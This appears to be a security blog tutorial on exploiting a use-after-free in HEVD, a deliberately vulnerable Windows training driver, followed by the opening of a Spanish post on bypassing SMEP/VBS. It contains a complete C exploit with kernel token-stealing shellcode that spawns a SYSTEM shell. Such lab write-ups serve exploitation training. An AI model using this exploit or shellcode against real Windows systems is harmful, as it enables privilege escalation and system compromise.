DbgPrint(\u0026#34;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 301 Status = UseUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp); 302 DbgPrint(\u0026#34;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 303 break; 304 case HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL: 305 DbgPrint(\u0026#34;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 306 Status = FreeUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp); 307 DbgPrint(\u0026#34;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 308 break; 309 case HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL: 310 DbgPrint(\u0026#34;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 311 Status = AllocateFakeObjectNonPagedPoolIoctlHandler(Irp, IrpSp); 312 DbgPrint(\u0026#34;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\\n\u0026#34;); 313 break; This however still did not give us the I/O Control Codes so before trying to search within each file using some grep-fu, let\u0026rsquo;s check the header file HackSysExtremeVulnerableDriver.h.\nWithin it we are given a list of IOCTL Codes :)\n81 #define HEVD_IOCTL_BUFFER_OVERFLOW_STACK IOCTL(0x800) 82 #define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS IOCTL(0x801) 83 #define HEVD_IOCTL_ARBITRARY_WRITE IOCTL(0x802) 84 #define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL IOCTL(0x803) 85 #define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL IOCTL(0x804) 86 #define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL IOCTL(0x805) 87 #define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL IOCTL(0x806) 88 #define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL IOCTL(0x807) 89 #define HEVD_IOCTL_TYPE_CONFUSION IOCTL(0x808) 90 #define HEVD_IOCTL_INTEGER_OVERFLOW IOCTL(0x809) 91 #define HEVD_IOCTL_NULL_POINTER_DEREFERENCE IOCTL(0x80A) 92 #define HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK IOCTL(0x80B) 93 #define HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL IOCTL(0x80C) 94 #define HEVD_IOCTL_DOUBLE_FETCH IOCTL(0x80D) 95 #define HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS IOCTL(0x80E) 96 #define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL IOCTL(0x80F) 97 #define HEVD_IOCTL_BUFFER_OVERFLOW_PAGED_POOL_SESSION IOCTL(0x810) 98 #define HEVD_IOCTL_WRITE_NULL IOCTL(0x811) 99 #define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX IOCTL(0x812) 100 #define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX IOCTL(0x813) 101 #define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX IOCTL(0x814) 102 #define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL_NX IOCTL(0x815) 103 #define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL_NX IOCTL(0x816) 104 #define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL_NX IOCTL(0x817) 105 #define HEVD_IOCTL_CREATE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX IOCTL(0x818) 106 #define HEVD_IOCTL_SET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX IOCTL(0x819) 107 #define HEVD_IOCTL_GET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX IOCTL(0x81A) 108 #define HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX IOCTL(0x81B) However, for this tutorial we\u0026rsquo;d only be focusing on the following:\n85 #define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL IOCTL(0x804) 86 #define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL IOCTL(0x805) 87 #define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL IOCTL(0x806) 88 #define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL IOCTL(0x807) Understanding AllocateUaFObjectNonPagedPoolIoctlHandler # We can find this function within UseAfterFreeNonPagedPool.c on line 357.\n357 NTSTATUS 358 AllocateUaFObjectNonPagedPoolIoctlHandler( 359 _In_ PIRP Irp, 360 _In_ PIO_STACK_LOCATION IrpSp 361 ) 362 { 363 NTSTATUS Status = STATUS_UNSUCCESSFUL; 364 365 UNREFERENCED_PARAMETER(Irp); 366 UNREFERENCED_PARAMETER(IrpSp); 367 PAGED_CODE(); 368 369 Status = AllocateUaFObjectNonPagedPool(); 370 371 return Status; 372 } This function ultimately calls AllocateUaFObjectNonPagedPool, which starts on line 86.\n86 NTSTATUS 87 AllocateUaFObjectNonPagedPool( 88 VOID 89 ) 90 { 91 NTSTATUS Status = STATUS_UNSUCCESSFUL; 92 PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree = NULL; 93 94 PAGED_CODE(); 95 96 __try 97 { 98 DbgPrint(\u0026#34;[+] Allocating UaF Object\\n\u0026#34;); 99 100 // 101 // Allocate Pool chunk 102 // 103 104 UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)ExAllocatePoolWithTag( 105 NonPagedPool, 106 sizeof(USE_AFTER_FREE_NON_PAGED_POOL), 107 (ULONG)POOL_TAG 108 ); 109 110 if (!UseAfterFree) 111 { 112 // 113 // Unable to allocate Pool chunk 114 // 115 116 DbgPrint(\u0026#34;[-] Unable to allocate Pool chunk\\n\u0026#34;); 117 118 Status = STATUS_NO_MEMORY; 119 return Status; 120 } 121 else 122 { 123 DbgPrint(\u0026#34;[+] Pool Tag: %s\\n\u0026#34;, STRINGIFY(POOL_TAG)); 124 DbgPrint(\u0026#34;[+] Pool Type: %s\\n\u0026#34;, STRINGIFY(NonPagedPool)); 125 DbgPrint(\u0026#34;[+] Pool Size: 0x%X\\n\u0026#34;, sizeof(USE_AFTER_FREE_NON_PAGED_POOL)); 126 DbgPrint(\u0026#34;[+] Pool Chunk: 0x%p\\n\u0026#34;, UseAfterFree); 127 } 128 129 // 130 // Fill the buffer with ASCII \u0026#39;A\u0026#39; 131 // 132 133 RtlFillMemory((PVOID)UseAfterFree-\u0026gt;Buffer, sizeof(UseAfterFree-\u0026gt;Buffer), 0x41); 134 135 // 136 // Null terminate the char buffer 137 // 138 139 UseAfterFree-\u0026gt;Buffer[sizeof(UseAfterFree-\u0026gt;Buffer) - 1] = \u0026#39;\\0\u0026#39;; 140 141 // 142 // Set the object Callback function 143 // 144 145 UseAfterFree-\u0026gt;Callback = \u0026amp;UaFObjectCallbackNonPagedPool; 146 147 // 148 // Assign the address of UseAfterFree to a global variable 149 // 150 151 g_UseAfterFreeObjectNonPagedPool = UseAfterFree; 152 153 DbgPrint(\u0026#34;[+] UseAfterFree Object: 0x%p\\n\u0026#34;, UseAfterFree); 154 DbgPrint(\u0026#34;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\\n\u0026#34;, g_UseAfterFreeObjectNonPagedPool); 155 DbgPrint(\u0026#34;[+] UseAfterFree-\u0026gt;Callback: 0x%p\\n\u0026#34;, UseAfterFree-\u0026gt;Callback); 156 } 157 __except (EXCEPTION_EXECUTE_HANDLER) 158 { 159 Status = GetExceptionCode(); 160 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 161 } 162 163 return Status; 164 } Let\u0026rsquo;s break down what this function is doing at a high-level.\nLines 91-92 we see variables being declared, one of them being a custom structure containing two members: a function pointer, and a char buffer[0x54]. On line 94 we see the PAGED_CODE macro defined. This macro marks this function as pageable. What this means is, if the function is not present in memory it may be moved to disk. The OS will do this if it needs physical memory for other tasks. Lines 104-108 we see a call to ExAllocatePoolWithTag() this is a Windows API call. Basically, what this does is allocate \u0026ldquo;pool memory\u0026rdquo; of a specified type and will return a pointer to the allocated block, which as we can see is then casted. Argument 1: Here we use a Nonpaged pool, which can be accessed from any IRQL, notably memory allocated with this type is EXECUTABLE. Argument 2: Size of the chunk. Argument 3: A pool tag, which from my understanding is for debugging purposes. We can find this in common.h as Hack or \u0026ldquo;kcaH\u0026rdquo; since it must be specified in reverse order. Lines 110-127 we can ignore as it\u0026rsquo;s just error/success checking the last call On line 133 we basically see a call to RtlFillMemory() another Windows API (memset in nix). On line 139 we NULL terminate the buffer we filled with A\u0026rsquo;s. On line 145 we set the function pointer to the UaFObjectCallbackNonPagedPool function. On line 151 we assign the address of the allocated object to a global variable. Pretty straight forward! We\u0026rsquo;re just allocating some memory (marked executable) to hold the PUSE_AFTER_FREE_NON_PAGED_POOL structure, fill the Buffer member (char array), and set the Callback member (function pointer). The structure definition can be seen below:\n62 typedef struct _USE_AFTER_FREE_NON_PAGED_POOL 63 { 64 FunctionPointer Callback; 65 CHAR Buffer[0x54]; 66 } USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL; Understanding UseUaFObjectNonPagedPoolIoctlHandler # Once again, this as a \u0026ldquo;wrapper\u0026rdquo; to call another function:\n375 /// \u0026lt;summary\u0026gt; 376 /// Use UaF Object NonPagedPool Ioctl Handler 377 /// \u0026lt;/summary\u0026gt; 378 /// \u0026lt;param name=\u0026#34;Irp\u0026#34;\u0026gt;The pointer to IRP\u0026lt;/param\u0026gt; 379 /// \u0026lt;param name=\u0026#34;IrpSp\u0026#34;\u0026gt;The pointer to IO_STACK_LOCATION structure\u0026lt;/param\u0026gt; 380 /// \u0026lt;returns\u0026gt;NTSTATUS\u0026lt;/returns\u0026gt; 381 NTSTATUS 382 UseUaFObjectNonPagedPoolIoctlHandler( 383 _In_ PIRP Irp, 384 _In_ PIO_STACK_LOCATION IrpSp 385 ) 386 { 387 NTSTATUS Status = STATUS_UNSUCCESSFUL; 388 389 UNREFERENCED_PARAMETER(Irp); 390 UNREFERENCED_PARAMETER(IrpSp); 391 PAGED_CODE(); 392 393 Status = UseUaFObjectNonPagedPool(); 394 395 return Status; 396 } Let\u0026rsquo;s look at UseUaFObjectNonPagedPool().\n171 NTSTATUS 172 UseUaFObjectNonPagedPool( 173 VOID 174 ) 175 { 176 NTSTATUS Status = STATUS_UNSUCCESSFUL; 177 178 PAGED_CODE(); 179 180 __try 181 { 182 if (g_UseAfterFreeObjectNonPagedPool) 183 { 184 DbgPrint(\u0026#34;[+] Using UaF Object\\n\u0026#34;); 185 DbgPrint(\u0026#34;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\\n\u0026#34;, g_UseAfterFreeObjectNonPagedPool); 186 DbgPrint(\u0026#34;[+] g_UseAfterFreeObjectNonPagedPool-\u0026gt;Callback: 0x%p\\n\u0026#34;, g_UseAfterFreeObjectNonPagedPool-\u0026gt;Callback); 187 DbgPrint(\u0026#34;[+] Calling Callback\\n\u0026#34;); 188 189 if (g_UseAfterFreeObjectNonPagedPool-\u0026gt;Callback) 190 { 191 g_UseAfterFreeObjectNonPagedPool-\u0026gt;Callback(); 192 } 193 194 Status = STATUS_SUCCESS; 195 } 196 } 197 __except (EXCEPTION_EXECUTE_HANDLER) 198 { 199 Status = GetExceptionCode(); 200 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 201 } 202 203 return Status; 204 } Ok, so pretty straightforward. We\u0026rsquo;re simply calling the Callback function pointer, which we previously saw was set in the AllocateUaFObjectNonPagedPoolIoctlHandler() to UaFObjectCallbackNonPagedPool.\nUnderstanding FreeUaFObjectNonPagedPoolIoctlHandler # Once again we see that this handler takes no arguments.\n405 NTSTATUS 406 FreeUaFObjectNonPagedPoolIoctlHandler( 407 _In_ PIRP Irp, 408 _In_ PIO_STACK_LOCATION IrpSp 409 ) 410 { 411 NTSTATUS Status = STATUS_UNSUCCESSFUL; 412 413 UNREFERENCED_PARAMETER(Irp); 414 UNREFERENCED_PARAMETER(IrpSp); 415 PAGED_CODE(); 416 417 Status = FreeUaFObjectNonPagedPool(); 418 419 return Status; 420 } Lets look at FreeUaFObjectNonPagedPool:\n211 NTSTATUS 212 FreeUaFObjectNonPagedPool( 213 VOID 214 ) 215 { 216 NTSTATUS Status = STATUS_UNSUCCESSFUL; 217 218 PAGED_CODE(); 219 220 __try 221 { 222 if (g_UseAfterFreeObjectNonPagedPool) 223 { 224 DbgPrint(\u0026#34;[+] Freeing UaF Object\\n\u0026#34;); 225 DbgPrint(\u0026#34;[+] Pool Tag: %s\\n\u0026#34;, STRINGIFY(POOL_TAG)); 226 DbgPrint(\u0026#34;[+] Pool Chunk: 0x%p\\n\u0026#34;, g_UseAfterFreeObjectNonPagedPool); 227 228 #ifdef SECURE 229 // 230 // Secure Note: This is secure because the developer is setting 231 // \u0026#39;g_UseAfterFreeObjectNonPagedPool\u0026#39; to NULL once the Pool chunk is being freed 232 // 233 234 ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG); 235 236 // 237 // Set to NULL to avoid dangling pointer 238 // 239 240 g_UseAfterFreeObjectNonPagedPool = NULL; 241 #else 242 // 243 // Vulnerability Note: This is a vanilla Use After Free vulnerability 244 // because the developer is not setting \u0026#39;g_UseAfterFreeObjectNonPagedPool\u0026#39; to NULL. 245 // Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer 246 // (dangling pointer) 247 // 248 249 ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG); 250 #endif 251 252 Status = STATUS_SUCCESS; 253 } 254 } 255 __except (EXCEPTION_EXECUTE_HANDLER) 256 { 257 Status = GetExceptionCode(); 258 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 259 } 260 261 return Status; 262 } Here we see a call to a new Windows API the ExFreePoolWithTag function. This function simply deallocates a block of pool memory allocated with the specified tag (Hack), however we can see that the global variable g_UseAfterFreeObjectNonPagedPool is never made NULL. This means g_UseAfterFreeObjectNonPagedPool will contain a pointer to the free\u0026rsquo;d object even after it\u0026rsquo;s been free\u0026rsquo;d. As the source mentions - a dangling pointer.\nUnderstanding AllocateFakeObjectNonPagedPoolIoctlHandler # Looking at this handler we can see it takes some user input on line 441.\n429 NTSTATUS 430 AllocateFakeObjectNonPagedPoolIoctlHandler( 431 _In_ PIRP Irp, 432 _In_ PIO_STACK_LOCATION IrpSp 433 ) 434 { 435 NTSTATUS Status = STATUS_UNSUCCESSFUL; 436 PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject = NULL; 437 438 UNREFERENCED_PARAMETER(Irp); 439 PAGED_CODE(); 440 441 UserFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)IrpSp-\u0026gt;Parameters.DeviceIoControl.Type3InputBuffer; 442 443 if (UserFakeObject) 444 { 445 Status = AllocateFakeObjectNonPagedPool(UserFakeObject); 446 } 447 448 return Status; 449 } From here, we call AllocateFakeObjectNonPagedPool.\n270 NTSTATUS 271 AllocateFakeObjectNonPagedPool( 272 _In_ PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject 273 ) 274 { 275 NTSTATUS Status = STATUS_SUCCESS; 276 PFAKE_OBJECT_NON_PAGED_POOL KernelFakeObject = NULL; 277 278 PAGED_CODE(); 279 280 __try 281 { 282 DbgPrint(\u0026#34;[+] Creating Fake Object\\n\u0026#34;); 283 284 // 285 // Allocate Pool chunk 286 // 287 288 KernelFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)ExAllocatePoolWithTag( 289 NonPagedPool, 290 sizeof(FAKE_OBJECT_NON_PAGED_POOL), 291 (ULONG)POOL_TAG 292 ); 293 294 if (!KernelFakeObject) 295 { 296 // 297 // Unable to allocate Pool chunk 298 // 299 300 DbgPrint(\u0026#34;[-] Unable to allocate Pool chunk\\n\u0026#34;); 301 302 Status = STATUS_NO_MEMORY; 303 return Status; 304 } 305 else 306 { 307 DbgPrint(\u0026#34;[+] Pool Tag: %s\\n\u0026#34;, STRINGIFY(POOL_TAG)); 308 DbgPrint(\u0026#34;[+] Pool Type: %s\\n\u0026#34;, STRINGIFY(NonPagedPool)); 309 DbgPrint(\u0026#34;[+] Pool Size: 0x%X\\n\u0026#34;, sizeof(FAKE_OBJECT_NON_PAGED_POOL)); 310 DbgPrint(\u0026#34;[+] Pool Chunk: 0x%p\\n\u0026#34;, KernelFakeObject); 311 } 312 313 // 314 // Verify if the buffer resides in user mode 315 // 316 317 ProbeForRead( 318 (PVOID)UserFakeObject, 319 sizeof(FAKE_OBJECT_NON_PAGED_POOL), 320 (ULONG)__alignof(UCHAR) 321 ); 322 323 // 324 // Copy the Fake structure to Pool chunk 325 // 326 327 RtlCopyMemory( 328 (PVOID)KernelFakeObject, 329 (PVOID)UserFakeObject, 330 sizeof(FAKE_OBJECT_NON_PAGED_POOL) 331 ); 332 333 // 334 // Null terminate the char buffer 335 // 336 337 KernelFakeObject-\u0026gt;Buffer[sizeof(KernelFakeObject-\u0026gt;Buffer) - 1] = \u0026#39;\\0\u0026#39;; 338 339 DbgPrint(\u0026#34;[+] Fake Object: 0x%p\\n\u0026#34;, KernelFakeObject); 340 } 341 __except (EXCEPTION_EXECUTE_HANDLER) 342 { 343 Status = GetExceptionCode(); 344 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 345 } 346 347 return Status; 348 } Let\u0026rsquo;s break this down:\nLines 288-311 we allocate a chunk just as before, but this time it\u0026rsquo;s a \u0026ldquo;fake object\u0026rdquo;. Just looking at the structure, it\u0026rsquo;s the same size as the PUSE_AFTER_FREE_NON_PAGED_POOL object Lines 317-321 we see a new Windows API ProbeForRead which checks that the user-mode buffer is correctly aligned. Lines 327-331 we RtlCopyMemory / move the usermode buffer into the fake object allocation Lines 333-347 we NULL terminate the buffer and return. For reference this is the fake object:\n68 typedef struct _FAKE_OBJECT_NON_PAGED_POOL 69 { 70 CHAR Buffer[0x58]; 71 } FAKE_OBJECT_NON_PAGED_POOL, *PFAKE_OBJECT_NON_PAGED_POOL; Noice, if you\u0026rsquo;re familiar with user mode exploitation your eyes are probably lit up by now.\nSummary of Functions # In short this is what the functions do:\nFunction Summary AllocateUaFObjectNonPagedPoolIoctlHandler We\u0026rsquo;re just allocating some memory (executable) to hold the PUSE_AFTER_FREE_NON_PAGED_POOL structure, fill the Buffer member (char array), and set the Callback member (function pointer) UseUaFObjectNonPagedPoolIoctlHandler Calls the Callback function pointer from the global variable g_UseAfterFreeObjectNonPagedPool FreeUaFObjectNonPagedPoolIoctlHandler Free\u0026rsquo;s the g_UseAfterFreeObjectNonPagedPool object, and DOES NOT NULL out the variable (dangling pointer) AllocateFakeObjectNonPagedPoolIoctlHandler Allocates an object the same size as the original allocation, but with user-controlled input. Looking at this we have a classic UAF. Never done a Windows UAF but I\u0026rsquo;m assuming that the fake object will take the previously allocated memories space. To exploit this in theory all we need to do is:\nAllocate a USE_AFTER_FREE_NON_PAGED_POOL object Free the object Allocate a FAKE_OBJECT_NON_PAGED_POOL object (reclaiming freed memory) Call g_UseAfterFreeObjectNonPagedPool.Callback which should point to the corrupted structure Exploitation # From here writing a PoC seemed pretty straightforward, and since we had source this should be pretty easy (object size wise).\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_ALLOCATE_ROBJ IOCTL(0x804) #define HEVD_CALL_FPTR IOCTL(0x805) #define HEVD_FREE IOCTL(0x806) #define HEVD_ALLOCATE_FOBJ IOCTL(0x807) typedef struct _FAKE_OBJECT_NON_PAGED_POOL { CHAR Buffer[0x58]; } FAKE_OBJECT_NON_PAGED_POOL, *PFAKE_OBJECT_NON_PAGED_POOL; void sendIoctl(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer) { DWORD bytesReturned = 0; printf(\u0026#34;[*] Calling IOCTL Code 0x%x\\n\u0026#34;, dIoctl); DeviceIoControl(hHEVD, dIoctl, pBuffer, dBuffer, NULL, 0x00, \u0026amp;bytesReturned, NULL); return; } char *allocate_buffer() { char *buffer = malloc(sizeof(FAKE_OBJECT_NON_PAGED_POOL)); if (buffer != NULL) { printf(\u0026#34;[*] Allocated %d bytes (userland)\\n\u0026#34;, sizeof(FAKE_OBJECT_NON_PAGED_POOL)); memset(buffer, 0x41, sizeof(FAKE_OBJECT_NON_PAGED_POOL)); } return buffer; } int main() { HANDLE hHEVD = NULL; char *evilBuffer = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } evilBuffer = allocate_buffer(); if (evilBuffer == NULL) { printf(\u0026#34;[*] Failed to allocate evil buffer (userland)\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Allocating PUSE_AFTER_FREE_NON_PAGED_POOL object\\n\u0026#34;); sendIoctl(hHEVD, HEVD_ALLOCATE_ROBJ, NULL, 0); printf(\u0026#34;[*] Freeing object\\n\u0026#34;); sendIoctl(hHEVD, HEVD_FREE, NULL, 0); printf(\u0026#34;[*] Allocating FAKE_OBJECT_NON_PAGED_POOL\\n\u0026#34;); sendIoctl(hHEVD, HEVD_ALLOCATE_FOBJ, evilBuffer, sizeof(FAKE_OBJECT_NON_PAGED_POOL)); printf(\u0026#34;[*] Triggering UAF\\n\u0026#34;); sendIoctl(hHEVD, HEVD_CALL_FPTR, NULL, 0); } Once sent, we can see we have successfully hijacked execution flow.\nNow since we see 41414141 we can assume that the first 4 bytes are the function pointer, we can confirm this based on the source code (UseAfterFreeNonPagedPool.h):\n62 typedef struct _USE_AFTER_FREE_NON_PAGED_POOL 63 { 64 FunctionPointer Callback; 65 CHAR Buffer[0x54]; 66 } USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL; Let\u0026rsquo;s write our exploit!\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_ALLOCATE_ROBJ IOCTL(0x804) #define HEVD_CALL_FPTR IOCTL(0x805) #define HEVD_FREE IOCTL(0x806) #define HEVD_ALLOCATE_FOBJ IOCTL(0x807) typedef struct _FAKE_OBJECT_NON_PAGED_POOL { CHAR Buffer[0x58]; } FAKE_OBJECT_NON_PAGED_POOL, *PFAKE_OBJECT_NON_PAGED_POOL; /* sendIoctl: Send the IOCTL code to the driver */ void sendIoctl(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer) { DWORD bytesReturned = 0; printf(\u0026#34;[*] Calling IOCTL Code 0x%x\\n\u0026#34;, dIoctl); DeviceIoControl(hHEVD, dIoctl, pBuffer, dBuffer, NULL, 0x00, \u0026amp;bytesReturned, NULL); return; } /* allocate_buffer: Creates a userland allocation with the first 4 bytes pointing to the address where our shellcode was allocated. */ char *allocate_buffer(void *shellcode_addr) { char *buffer = malloc(sizeof(FAKE_OBJECT_NON_PAGED_POOL)); if (buffer != NULL) { printf(\u0026#34;[*] Shellcode located at: %p\\n\u0026#34;, \u0026amp;shellcode_addr); memcpy(buffer, \u0026amp;shellcode_addr, 4); memset(buffer+4, \u0026#39;A\u0026#39;, 83); } return buffer; } int main() { HANDLE hHEVD = NULL; char *evilBuffer = NULL; char shellcode[] = // sickle -a x86 -p windows/x86/kernel_token_stealer -f c -m pinpoint \u0026#34;\\x60\u0026#34; // pushal \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\u0026#34; // mov eax, dword ptr fs:[eax + 0x124] \u0026#34;\\x8b\\x40\\x50\u0026#34; // mov eax, dword ptr [eax + 0x50] \u0026#34;\\x89\\xc1\u0026#34; // mov ecx, eax \u0026#34;\\xba\\x04\\x00\\x00\\x00\u0026#34; // mov edx, 4 \u0026#34;\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov eax, dword ptr [eax + 0xb8] \u0026#34;\\x2d\\xb8\\x00\\x00\\x00\u0026#34; // sub eax, 0xb8 \u0026#34;\\x39\\x90\\xb4\\x00\\x00\\x00\u0026#34; // cmp dword ptr [eax + 0xb4], edx \u0026#34;\\x75\\xed\u0026#34; // jne 0x1014 \u0026#34;\\x8b\\x90\\xf8\\x00\\x00\\x00\u0026#34; // mov edx, dword ptr [eax + 0xf8] \u0026#34;\\x89\\x91\\xf8\\x00\\x00\\x00\u0026#34; // mov dword ptr [ecx + 0xf8], edx \u0026#34;\\x61\u0026#34; // popal // return to userland code \u0026#34;\\x31\\xc0\u0026#34; // xor eax,eax \u0026#34;\\xC3\u0026#34;; // ret LPVOID lpPayload = VirtualAlloc(NULL, 56, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpPayload == NULL) { printf(\u0026#34;[-] Failed to create shellcode allocation\\n\u0026#34;); return -1; } memcpy(lpPayload, shellcode, 56); hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } evilBuffer = allocate_buffer(lpPayload); if (evilBuffer == NULL) { printf(\u0026#34;[*] Failed to allocate evil buffer (userland)\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Allocating PUSE_AFTER_FREE_NON_PAGED_POOL object\\n\u0026#34;); sendIoctl(hHEVD, HEVD_ALLOCATE_ROBJ, NULL, 0); printf(\u0026#34;[*] Freeing object\\n\u0026#34;); sendIoctl(hHEVD, HEVD_FREE, NULL, 0); printf(\u0026#34;[*] Allocating FAKE_OBJECT_NON_PAGED_POOL\\n\u0026#34;); sendIoctl(hHEVD, HEVD_ALLOCATE_FOBJ, evilBuffer, sizeof(FAKE_OBJECT_NON_PAGED_POOL)); printf(\u0026#34;[*] Triggering UAF\\n\u0026#34;); sendIoctl(hHEVD, HEVD_CALL_FPTR, NULL, 0); printf(\u0026#34;[+] Enjoy the shell :)\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } Once compiled:\ni686-w64-mingw32-gcc poc.c -o poc.exe We get our shell!\nSources # https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/paged_code ","date":"14 December 2024","externalUrl":null,"permalink":"/posts/0x02-introduction-to-windows-kernel-uafs/","section":"Posts","summary":"","title":"0x02 - Introduction to Windows Kernel Use After Frees (UaFs)","type":"posts"},{"content":"Esto fue posible por trabajo duro y determinación. No te sientas frustrado si estas cosas no las entiendes inmediatamente, y recordarte la fuente de la verdad siempre será el código. Y, para nosotros, el código es assembly crudo. Es importante que entiendas estas técnicas porque cuando Microsoft saca nuevas mitigaciones tu fundación te permitirá desarrollar evasiones. Entonces, si algo no está claro, tóma tu tiempo y revísalo con WinDbg.\nEn el último artículo deberías haber obtenido un entendimiento sólido de los fundamentos de Windows Kernel Explotación. Ahora saltaremos al abismo y explotaremos Windows 10 (x64) y Windows 11 (x64). Dentro de este artículo encontrarás una introducción, a algunos de los últimos mitigaciones implementado por Microsoft y verás con qué \u0026ldquo;facilidad\u0026rdquo; los venceremos. Con eso dicho solo ALGUNOS serán cubierto, existen más, pero solo los cubriremos cuando sean relevantes.\nAdemás, esta publicación incluye mi cadena de ROP - Violet Phosphorus, un método universal para evadir VBS/SMEP. Que yo sepa, no he visto esta técnica implementada por otros artículos. Con esto dicho, lo clamo como mi técnica,\nPara demostrar lo efectivo que es, seguí adelante y lo probé contra el nuevo versión de Windows - Windows 11 24H2 solo por esta publicación.\nDESCARGO DE RESPONSABILIDAD: PARA QUEDAR CLARO ESTA TÉCNICA NO FUE HECHO PARA EVITAR HVCI Table of Contents # Entrando al Mundo Moderno Eludiendo SMEP (Teoría) Encontrar \u0026ldquo;Gadgets\u0026rdquo; y Como Usarlos Encontrar la dirección base de el Kernel Evadiendo VBS (Teoría) Violet Phosphorus Entendiendo la Cadena de \u0026ldquo;ROP\u0026rdquo; Creando una Prueba de Concepto (POC) Explotación (Rip \u0026amp; Tear) Recursos Entrando al Mundo Moderno # Teniendo en cuenta que explotamos un \u0026ldquo;Stack Overflow\u0026rdquo; dentro de Windows 7 (x86) y hemos cubierto sus operaciones. No había necesidad de repetir el análisis del la vulnerabilidad, al menos no para este tipo de vulnerabilidad. 